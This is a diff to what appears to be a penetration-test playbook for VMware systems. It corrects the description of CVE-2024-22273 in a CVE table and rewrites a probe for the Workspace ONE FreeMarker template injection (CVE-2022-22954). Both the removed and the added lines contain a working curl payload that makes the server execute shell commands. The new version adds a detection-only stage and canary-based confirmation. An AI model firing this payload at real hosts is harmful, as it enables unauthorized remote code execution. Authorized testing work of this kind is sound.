@@ -53,7 +53,7 @@ Map build → version → CVE applicability via VMware advisories (vmware.com/se
 | CVE | Affected | Vector | Status |
 |---|---|---|---|
 | **CVE-2024-37085** | ESXi 7.0/8.0 < specific patch | AD group "ESX Admins" auto-admin bypass | High — Domain takeover→ESXi RCE, exploited in ransomware ops |
-| **CVE-2024-22273** | Aria Operations | Pre-auth SSRF | Medium |
+| **CVE-2024-22273** | ESXi/Workstation/Fusion/vCenter storage controller | OOB read/write — requires VM-local access (NOT a pre-auth network SSRF; see Section 9) | Important (CVSS 8.1), not external pre-auth |
 | **CVE-2024-22252/53** | Workstation/Fusion (not vCenter) | Sandbox escape | Not external |
 | **CVE-2023-34048** | vCenter 7/8 < specific build | DCE/RPC pre-auth heap OOB write → RCE | Critical, patched 2023-10 |
 | **CVE-2023-20887** | Aria Operations for Networks | Pre-auth command injection → RCE | Critical |
@@ -89,12 +89,21 @@ Public PoC by Mikhail Klyuchnikov exists; do not execute against client infra wi
 ## Step 4 — CVE-2022-22954 (Workspace ONE SSTI) probe
 
 ```bash
-# Workspace ONE Access vulnerable endpoint
-curl -sk "https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=\${\"freemarker.template.utility.Execution\"?new()(\"id\")}"
-# Look for "uid=" in response → confirmed RCE (Freemarker)
+# Stage A — detection only: reachability + baseline. No command execution yet.
+curl -sk -o /tmp/wone_baseline.txt -w "%{http_code}\n" \
+  "https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=probe"
+# 4xx with FreeMarker/catalog-portal error template → endpoint present, candidate vulnerable.
+# 404 → patched/removed. Keep the baseline body to diff against Stage B.
+
+# Stage B — execution (ONLY with explicit RCE-attempt sign-off): emit a unique canary
+# so a coincidental WAF/error page containing "uid=" cannot be mistaken for real output.
+CANARY="VCTR$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')"
+curl -sk "https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=\${\"freemarker.template.utility.Execution\"?new()(\"echo ${CANARY}; id\")}"
+# Confirmed RCE ONLY if the response contains the exact $CANARY echoed back AND "uid=" output
+# that is absent from /tmp/wone_baseline.txt (in-band command output, body-diff against baseline).
 ```
 
-If page reflects template error / executes command → critical. Stop and report.
+Confirmed RCE requires the unique `$CANARY` reflected in-band plus `uid=` output not present in the Stage-A baseline → critical. Stop and report. A bare `uid=` with no canary echo is NOT confirmation.
 
 ---
 
